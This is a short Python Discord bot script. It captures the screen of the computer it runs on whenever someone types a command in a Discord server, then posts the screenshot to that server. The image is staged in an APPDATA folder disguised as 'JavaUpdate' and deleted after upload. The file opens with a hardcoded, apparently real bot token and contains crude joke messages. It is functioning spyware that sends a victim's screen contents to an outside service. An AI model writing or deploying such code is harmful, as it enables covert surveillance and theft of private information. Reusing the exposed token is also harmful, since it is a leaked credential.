#change the variable token to your discord bot token
#type !screenshot in your discord server with the bot and see the magic XD
#feel free to change the code as you want specially the discord bot settings

token = "MTAyODIxNDI3MDkxMzE1MDk4Ng.G1J67B.yg3W28SFjBMdiCezKcK_bNLwi3c5Xs8_wXLZU4"


#code

#----------------------------------------------------------------------------------#

import discord
from discord.ext import commands
import pyautogui
import os
import time
appdata = os.getenv("APPDATA")
pathfld = rf"{appdata}\JavaUpdate"
pathss = rf"{appdata}\JavaUpdate\screenshot.png"


def screenshitting():
    if not os.path.exists(pathfld):
        os.makedirs(f"{appdata}\JavaUpdate")
        print(f"created new folder at {pathfld}")


    print (appdata)
    screenshot = pyautogui.screenshot()
    screenshot.save(rf'{appdata}\JavaUpdate\screenshot.png')







client = commands.Bot(command_prefix = "!", case_insensitive = True, intents=discord.Intents.all())
@client.event
async def on_ready():
    print('connected.')
    
    
    
    
@client.command()
async def screenshit(ctx):
    await ctx.send("hmmmmm i like balls")


@client.command()
async def screenshot(ctx):
    screenshitting()
    embed = discord.Embed(
        title = "Screenshit",
        description = "took a screenshit",
        colour = discord.Colour.blue()  )
    file = discord.File(pathss, filename="screenshot.png")
    await ctx.send(file=file, embed=embed)
    
    time.sleep(2)
    
    os.remove(pathss)
    
client.run(token)
